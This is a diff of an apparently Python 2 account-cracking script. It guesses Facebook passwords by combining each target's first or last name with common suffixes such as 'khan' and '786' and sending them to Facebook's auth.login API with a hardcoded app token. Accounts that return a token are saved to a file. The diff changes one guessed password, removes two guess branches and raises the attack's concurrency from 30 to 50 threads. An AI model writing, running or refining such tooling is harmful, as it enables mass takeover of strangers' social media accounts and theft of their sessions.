@@ -366,7 +366,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name'] + '12345'
+													pass6 = b['first_name'] + 'khan'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -393,27 +393,11 @@ def pilih_super():
                                                                                                                                         cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
-																else:
-																	pass8 = '786000'
-																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-                                                                                                                                        q = json.load(data)
-																	if 'access_token' in q:
-																		print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m✮\x1b[1;32m ' + user + ' \x1b[1;32m✮\x1b[1;32m ' + pass8 + ' \x1b[1;32m✮\x1b[1;32m ' + b['name']	
-																		oks.append(user+pass8)
-                                                                                                                                        else:
-																		a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-																		b = json.loads(a.text)
-																		pass9 = b['last_name'] + '786'
-																		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-                                                                                                                                                q = json.load(data)
-																		if 'access_token' in q:
-                                                                                                                                                        print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m✮\x1b[1;32m ' + user + ' \x1b[1;32m✮\x1b[1;32m ' + pass9 + ' \x1b[1;32m✮\x1b[1;32m ' + b['name']
-																			oks.append(user+pass9)
 															
 		except:
 			pass
 		
-	p = ThreadPool(30)
+	p = ThreadPool(50)
 	p.map(main, id)
 	print "\033[1;97m---------------------------------------------------"
 	
